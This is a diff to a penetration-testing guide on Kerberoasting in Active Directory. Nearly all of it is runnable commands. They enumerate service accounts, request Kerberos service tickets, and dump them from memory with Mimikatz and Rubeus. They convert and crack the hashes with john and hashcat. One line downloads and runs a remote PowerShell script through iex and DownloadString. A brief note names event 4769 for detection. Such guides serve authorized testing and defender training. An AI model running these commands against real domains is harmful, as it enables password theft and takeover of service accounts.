@@ -29,46 +29,79 @@ Therefore, to perform Kerberoasting, only a domain account that can request for 
 
 **You need valid credentials inside the domain.**
 
-{% code title="From linux" %}
+### **Attack**
+
+{% hint style="warning" %}
+**Kerberoasting tools** typically request **`RC4 encryption`** when performing the attack and initiating TGS-REQ requests. This is because **RC4 is** [**weaker**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256.\
+RC4 (type 23) hashes begin with **`$krb5tgs$23$*`** while AES-256(type 18) start with **`$krb5tgs$18$*`**`.`
+{% endhint %}
+
+#### **Linux**
+
 ```bash
 msf> use auxiliary/gather/get_user_spns
 GetUserSPNs.py -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
 GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
 ```
-{% endcode %}
 
-{% code title="From Windows, from memory to disk" %}
-```bash
-Get-NetUser -SPN | select serviceprincipalname #PowerView, get user service accounts
+#### Windows
 
-#Get TGS in memory
+* **Enumerate Kerberoastable users**
+
+```powershell
+# Get Kerberoastable users
+setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
+Get-NetUser -SPN | select serviceprincipalname #Powerview
+.\Rubeus.exe kerberosat /stats
+```
+
+* **Technique 1: Ask for TGS and dump it from memory**
+
+```powershell
+#Get TGS in memory from a single user
 Add-Type -AssemblyName System.IdentityModel 
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local 
- 
-klist #List kerberos tickets in memory
- 
-Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder
-```
-{% endcode %}
 
-{% code title="From Windows" %}
+#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
+setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+
+#List kerberos tickets in memory
+klist
+
+# Extract them from memory
+Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder
+
+# Transform kirbi ticket to john
+python2.7 kirbi2john.py sqldev.kirbi
+# Transform john to hashcat
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+```
+
+* **Technique 2: Automatic tools**
+
 ```bash
-# Powerview
-Request-SPNTicket -SPN "<SPN>" #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
+# Powerview: Get Kerberoast hash of a user
+Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
+# Powerview: Get all Kerberoast hashes
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
 
 # Rubeus
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 .\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins
 
 # Invoke-Kerberoast
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
-{% endcode %}
+
+
 
 {% hint style="warning" %}
 When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.
 {% endhint %}
+
+
 
 ![](<../../.gitbook/assets/image (9) (1) (2).png>)
 
@@ -80,7 +113,7 @@ Get Access Today:
 
 ### Cracking
 
-```
+```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
